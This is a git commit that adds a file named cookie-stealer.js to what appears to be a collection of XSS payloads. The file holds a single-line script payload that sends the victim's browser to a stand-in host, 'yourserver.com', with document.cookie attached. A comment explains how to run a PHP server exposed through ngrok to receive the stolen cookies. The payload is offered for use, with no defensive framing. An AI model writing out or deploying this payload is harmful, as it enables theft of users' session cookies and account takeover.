836270b5d15d73d9a5f97351ef23df5f875ed636
Komodo <68278515+komodoooo@users.noreply.github.com>
2022-07-15 20:23:07 +0200

    Create cookie-stealer.js

---
+++ xss/useful/cookie-stealer.js
@@ -0,0 +1,6 @@
+<script>document.location=“http://yourserver.com/?c="+document.cookie;</script>
+/*
+For example, to start a little server with php and ngrok i do:
+php -S localhost:<port>
+ngrok http <port>
+*/
